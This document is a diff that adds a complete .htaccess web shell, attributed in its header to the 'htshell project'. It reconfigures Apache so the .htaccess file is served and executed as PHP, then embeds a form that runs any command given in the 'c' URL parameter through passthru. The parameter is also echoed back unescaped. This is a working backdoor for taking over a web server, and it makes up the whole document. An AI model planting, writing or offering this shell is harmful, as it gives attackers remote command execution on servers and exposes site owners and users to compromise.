@@ -1,0 +1,12 @@
+# ALIF FUSOBAR - master@itsecurity.id - www.itsecurity.id
+# Self contained .htaccess web shell - Part of the htshell project.
+
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+AddType application/x-httpd-suphp .htaccess
+
+###### SHELL ######
+<?php echo "suPHP does not set ENV, so use full path for binaries:<form method='get'><input type='text' name='c' value='".$_GET['c']."'><input type='submit' name='go' value='Go!'></form>\n<pre>";passthru($_GET['c']." 2>&1");echo "</pre>"; ?>
